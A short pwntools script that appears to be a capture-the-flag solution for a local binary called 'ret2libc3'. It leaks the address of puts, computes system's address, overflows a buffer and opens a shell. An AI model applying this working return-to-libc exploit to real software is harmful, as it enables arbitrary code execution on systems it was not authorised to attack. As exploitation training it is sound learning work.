from pwn import *

sh = process("./ret2libc3")
elf = ELF("./ret2libc3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
print(sh.recv())
puts_libc_addr = libc.symbols["puts"]
system_libc_addr = libc.symbols["system"]
offset = system_libc_addr - puts_libc_addr
puts_got = elf.got["puts"]
sh.send(str(puts_got)) #use See_something to get puts really address
answer = str(sh.recv())
print(answer)
puts_addr = eval(answer.split("\\n")[0][-10:])
print("dynamic puts_addr: ", hex(puts_addr))
system_addr = puts_addr + offset
print("dynamic system_addr: ", hex(system_addr))
sh_addr = 0x0804829e
payload = flat([b'a'*60, p32(system_addr), b'aaaa', p32(sh_addr)])

sh.send(payload)
sh.interactive()

